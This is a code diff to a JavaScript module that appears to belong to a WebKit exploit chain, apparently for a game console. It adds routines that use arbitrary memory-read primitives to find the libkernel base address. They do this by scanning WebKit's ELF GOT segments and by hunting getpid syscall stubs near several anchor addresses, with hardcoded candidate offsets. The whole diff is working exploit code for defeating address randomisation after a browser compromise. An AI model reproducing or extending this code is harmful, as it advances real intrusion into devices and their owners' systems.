@@ -7,7 +7,9 @@ import { webkitRvaMax } from "./pivot_gadgets.js";
 
 const ELF_MAGIC = 0x464c457f;
 const PT_LOAD = 1;
+const PF_R = 4;
 const PF_W = 2;
+const PF_X = 1;
 
 const SS_LK_BASE = "wk-libkernelBase";
 const SS_IAT_RVA = "wk-imp-error-rva";
@@ -53,18 +55,55 @@ function rvaAllowed(rva, off) {
     return rva >= 0x10000 && rva <= iatCap(off);
 }
 
-export function isGetpidStub(v) {
+export function isSyscallStub(v, num) {
     if (!v) return false;
-    return (v.low & 0x00ffffff) === 0xc0c748
-        && (v.hi >>> 24) === 0x49
-        && (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) === 20;
+    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
+    const n = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
+    return n === num;
 }
 
-/** Cheap prologue check — one read1 only. */
+export function isGetpidStub(v) {
+    return isSyscallStub(v, 20);
+}
+
+const GETPID_STUB_CANDS = [
+    0x2cb70, 0x2d5e0, 0x2cb80, 0x2cc00, 0x28000, 0x29000, 0x2a000, 0x2b000,
+    0x30000, 0x31000, 0x32000, 0x25000, 0x26000,
+];
+
+function getpidStubOffsets(off) {
+    const out = [];
+    if (off.k_stubs && off.k_stubs[20] != null) out.push(off.k_stubs[20]);
+    for (let i = 0; i < GETPID_STUB_CANDS.length; i++) {
+        const v = GETPID_STUB_CANDS[i];
+        if (out.indexOf(v) < 0) out.push(v);
+    }
+    return out;
+}
+
+function lkFromStubAddr(p, stubAddr, off) {
+    const offs = getpidStubOffsets(off);
+    for (let i = 0; i < offs.length; i++) {
+        const lk = stubAddr.sub32(offs[i]);
+        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
+            return { lk, stubOff: offs[i] };
+    }
+    let page = new int64((stubAddr.low >>> 0) & ~0x3fff, stubAddr.hi >>> 0);
+    for (let back = 0; back <= 0x40000; back += 0x4000) {
+        const lk = page.sub32(back);
+        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
+            return { lk, stubOff: Number(ptrBig(stubAddr) - ptrBig(lk)) };
+    }
+    return null;
+}
+
+/** Cheap prologue check — two reads (mov eax, imm; syscall). */
 export function isLibkernelPrologue(p, lk) {
     if (!lk || lk.hi < 0x8) return false;
-    const b0 = read1p(p, lk);
-    return b0 === 0xb8;
+    const w0 = read4p(p, lk);
+    const w1 = read4p(p, lk.add32(4));
+    if (w0 == null || w1 == null) return false;
+    return (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f;
 }
 
 export function saveLibkernelSession(lk, iatRva) {
@@ -124,10 +163,10 @@ function kErrorCandidates(off) {
 }
 
 function lkFromFnPtr(p, fnPtr, off, iatRva) {
-    if (isGetpidStub(fnPtr) && off.k_stubs && off.k_stubs[20] != null) {
-        const lk = fnPtr.sub32(off.k_stubs[20]);
-        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
-            return { lk, iatRva, errorFn: fnPtr, via: "getpid" };
+    if (isGetpidStub(fnPtr)) {
+        const hit = lkFromStubAddr(p, fnPtr, off);
+        if (hit)
+            return { lk: hit.lk, iatRva, errorFn: fnPtr, via: "getpid+" + hit.stubOff.toString(16) };
     }
 
     const entryB0 = read1p(p, fnPtr);
@@ -159,10 +198,9 @@ function safeVerifyGotSlot(p, webkitBase, off, rva) {
     return lkFromFnPtr(p, fnPtr, off, rva);
 }
 
-/** Sparse getpid stub hunter ±128MB from webkit (1 read8 per 1MB step). */
-function scanLibkernelStubChunk(p, webkitBase, off, sub) {
-    const stubOff = off.k_stubs && off.k_stubs[20];
-    if (!stubOff) {
+/** Sparse getpid stub hunter ±128MB from anchor(s), 4KB steps. */
+function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors) {
+    if (!anchors || !anchors.length) {
         return { done: true, lk: null, state: sub, phase: "stub-skip" };
     }
 
@@ -170,17 +208,22 @@ function scanLibkernelStubChunk(p, webkitBase, off, sub) {
     const STEP = 0x1000n;
 
     if (!sub) {
-        const center = ptrBig(webkitBase);
         sub = {
-            cursor: center > RADIUS ? center - RADIUS : 0n,
-            end: center + RADIUS,
+            anchorIdx: 0,
+            anchors: anchors.map(a => ptrBig(a)),
+            cursor: 0n,
+            end: 0n,
             step: STEP,
             probes: 0,
         };
+        const center = sub.anchors[0];
+        sub.cursor = center > RADIUS ? center - RADIUS : 0n;
+        sub.end = center + RADIUS;
         return {
             done: false,
             state: sub,
             phase: "stub-start",
+            anchor: 0,
             from: sub.cursor.toString(16),
             to: sub.end.toString(16),
         };
@@ -193,15 +236,16 @@ function scanLibkernelStubChunk(p, webkitBase, off, sub) {
             sub.probes++;
             const v = read8p(p, addr);
             if (isGetpidStub(v)) {
-                const lk = addr.sub32(stubOff);
-                if (lkAligned(lk) && isLibkernelPrologue(p, lk)) {
-                    saveLibkernelSession(lk, null);
+                const hit = lkFromStubAddr(p, addr, off);
+                if (hit) {
+                    saveLibkernelSession(hit.lk, null);
                     return {
                         done: true,
-                        lk,
+                        lk: hit.lk,
                         iatRva: null,
                         source: "stub-near",
                         stubAt: String(addr),
+                        stubOff: hit.stubOff,
                         state: sub,
                         phase: "stub-hit",
                     };
@@ -213,6 +257,21 @@ function scanLibkernelStubChunk(p, webkitBase, off, sub) {
     }
 
     if (sub.cursor > sub.end) {
+        const next = sub.anchorIdx + 1;
+        if (next < sub.anchors.length) {
+            sub.anchorIdx = next;
+            const center = sub.anchors[next];
+            sub.cursor = center > RADIUS ? center - RADIUS : 0n;
+            sub.end = center + RADIUS;
+            return {
+                done: false,
+                state: sub,
+                phase: "stub-anchor",
+                anchor: next,
+                from: sub.cursor.toString(16),
+                to: sub.end.toString(16),
+            };
+        }
         return { done: true, lk: null, state: sub, phase: "stub-miss", probes: sub.probes };
     }
 
@@ -222,9 +281,12 @@ function scanLibkernelStubChunk(p, webkitBase, off, sub) {
         phase: "stub",
         at: sub.cursor.toString(16),
         probes: sub.probes,
+        anchor: sub.anchorIdx,
     };
 }
-export function elfMappedRwRanges(p, webkitBase, off) {
+
+/** PT_LOAD readable non-exec within cap — RELRO .got + writable data. */
+export function elfMappedGotRanges(p, webkitBase, off) {
     const cap = iatCap(off);
     if (read4p(p, webkitBase) !== ELF_MAGIC) return [];
     if (read2p(p, webkitBase.add32(0x12)) !== 0x3e) return [];
@@ -240,7 +302,8 @@ export function elfMappedRwRanges(p, webkitBase, off) {
         const pType = read4p(p, webkitBase.add32(ph));
         if (pType !== PT_LOAD) continue;
         const pFlags = read4p(p, webkitBase.add32(ph + 4));
-        if ((pFlags & PF_W) === 0) continue;
+        if ((pFlags & PF_R) === 0) continue;
+        if ((pFlags & PF_X) !== 0) continue;
 
         const wVaddr = read8p(p, webkitBase.add32(ph + 0x10));
         const wMemsz = read8p(p, webkitBase.add32(ph + 0x28));
@@ -251,10 +314,16 @@ export function elfMappedRwRanges(p, webkitBase, off) {
         if (lo >= cap) continue;
         if (hi > cap) hi = cap;
         if (lo + 0x1000 >= hi) continue;
-        ranges.push({ lo: lo & ~7, hi, tag: "rw" + i });
+        const tag = (pFlags & PF_W) ? "rw" : "ro";
+        ranges.push({ lo: lo & ~7, hi, tag: tag + i });
     }
     ranges.sort((a, b) => a.lo - b.lo);
     return ranges;
+}
+
+/** @deprecated alias */
+export function elfMappedRwRanges(p, webkitBase, off) {
+    return elfMappedGotRanges(p, webkitBase, off);
 }
 
 function rvaInRwRanges(rva, ranges) {
@@ -276,9 +345,9 @@ function iatHitReturn(state, hit, source) {
     };
 }
 
-function beginRwScan(state, ranges) {
-    state.phase = "rw";
-    state.rwRanges = ranges;
+function beginGotScan(state, ranges) {
+    state.phase = "got";
+    state.gotRanges = ranges;
     state.rangeIdx = 0;
     state.cursor = ranges[0].lo;
     state.endRva = ranges[0].hi;
@@ -286,7 +355,7 @@ function beginRwScan(state, ranges) {
 }
 
 /**
- * Chunked RW-GOT scan — only mapped ELF writable segments.
+ * Chunked GOT scan — ELF readable non-exec segments (RELRO + writable).
  */
 export function scanErrorIatChunk(p, webkitBase, off, state) {
     if (!state) {
@@ -294,29 +363,30 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
     }
 
     if (state.phase === "ranges") {
-        const ranges = elfMappedRwRanges(p, webkitBase, off);
+        const ranges = elfMappedGotRanges(p, webkitBase, off);
         if (!ranges.length) {
             state.done = true;
-            return { done: true, lk: null, state, phase: "no-rw" };
+            return { done: true, lk: null, state, phase: "no-got" };
         }
-        beginRwScan(state, ranges);
+        beginGotScan(state, ranges);
         return {
             done: false,
             state,
-            phase: "rw-start",
+            phase: "got-start",
             ranges: ranges.map(r => "+0x" + r.lo.toString(16)
-                + "…+0x" + r.hi.toString(16)).join(" "),
+                + "…+0x" + r.hi.toString(16) + "(" + r.tag + ")").join(" "),
         };
     }
 
-    if (state.phase === "rw") {
+    if (state.phase === "got" || state.phase === "rw") {
+        const ranges = state.gotRanges || state.rwRanges;
         let steps = 0;
         while (state.cursor < state.endRva && steps < 24) {
-            if (rvaInRwRanges(state.cursor, state.rwRanges)) {
+            if (rvaInRwRanges(state.cursor, ranges)) {
                 state.slots++;
                 const hit = safeVerifyGotSlot(p, webkitBase, off, state.cursor);
                 if (hit)
-                    return iatHitReturn(state, hit, "rw-got");
+                    return iatHitReturn(state, hit, "got");
             }
             state.cursor += 8;
             steps++;
@@ -324,31 +394,31 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
 
         if (state.cursor >= state.endRva) {
             const next = (state.rangeIdx || 0) + 1;
-            if (next < state.rwRanges.length) {
+            if (next < ranges.length) {
                 state.rangeIdx = next;
-                state.cursor = state.rwRanges[next].lo;
-                state.endRva = state.rwRanges[next].hi;
+                state.cursor = ranges[next].lo;
+                state.endRva = ranges[next].hi;
                 return {
                     done: false,
                     state,
-                    phase: "rw-region",
-                    region: state.rwRanges[next].tag,
+                    phase: "got-region",
+                    region: ranges[next].tag,
                     cursor: state.cursor,
                     end: state.endRva,
                 };
             }
             state.done = true;
-            return { done: true, lk: null, state, phase: "rw-miss", slots: state.slots };
+            return { done: true, lk: null, state, phase: "got-miss", slots: state.slots };
         }
 
         return {
             done: false,
             state,
-            phase: "rw",
+            phase: "got",
             cursor: state.cursor,
             end: state.endRva,
             slots: state.slots,
-            region: state.rwRanges[state.rangeIdx].tag,
+            region: ranges[state.rangeIdx].tag,
         };
     }
 
@@ -357,17 +427,18 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
 }
 
 /**
- * RW GOT scan, then sparse getpid-stub hunt if RW misses.
+ * GOT (RELRO+RW) scan, then getpid-stub hunt from webkit/nativeFn anchors.
  */
-export function scanLibkernelChunk(p, webkitBase, off, state) {
+export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
+    opts = opts || {};
     if (!state) {
-        state = { stage: "rw", sub: null, rwSlots: 0, done: false };
+        state = { stage: "got", sub: null, gotSlots: 0, done: false, anchors: null };
     }
 
-    if (state.stage === "rw") {
+    if (state.stage === "got" || state.stage === "rw") {
         const c = scanErrorIatChunk(p, webkitBase, off, state.sub);
         state.sub = c.state;
-        if (c.slots != null) state.rwSlots = c.slots;
+        if (c.slots != null) state.gotSlots = c.slots;
         if (c.done && c.lk) {
             return {
                 done: true,
@@ -386,14 +457,22 @@ export function scanLibkernelChunk(p, webkitBase, off, state) {
                 state,
                 phase: "stub-next",
                 prev: c.phase,
-                slots: state.rwSlots,
+                slots: state.gotSlots,
             };
         }
         return Object.assign({ state }, c);
     }
 
     if (state.stage === "stub") {
-        const c = scanLibkernelStubChunk(p, webkitBase, off, state.sub);
+        if (!state.anchors) {
+            state.anchors = [webkitBase];
+            if (opts.nativeFn) {
+                const nb = ptrBig(opts.nativeFn);
+                const wb = ptrBig(webkitBase);
+                if (nb !== wb) state.anchors.push(opts.nativeFn);
+            }
+        }
+        const c = scanLibkernelStubChunk(p, webkitBase, off, state.sub, state.anchors);
         state.sub = c.state;
         if (c.done && c.lk) {
             return {
@@ -404,6 +483,7 @@ export function scanLibkernelChunk(p, webkitBase, off, state) {
                 state,
                 phase: c.phase,
                 stubAt: c.stubAt,
+                stubOff: c.stubOff,
             };
         }
         if (c.done) {
@@ -414,7 +494,7 @@ export function scanLibkernelChunk(p, webkitBase, off, state) {
                 state,
                 phase: c.phase,
                 probes: c.probes,
-                slots: state.rwSlots,
+                slots: state.gotSlots,
             };
         }
         return Object.assign({ state }, c);
@@ -427,8 +507,8 @@ export function resolveLibkernel(p, webkitBase, off, opts) {
     opts = opts || {};
     const log = opts.log || (() => {});
 
-    if (!off || off.k__error == null)
-        return { ok: false, error: "missing k__error" };
+    if (!off)
+        return { ok: false, error: "missing offsets" };
 
     try {
         const rawLk = sessionStorage.getItem(SS_LK_BASE);
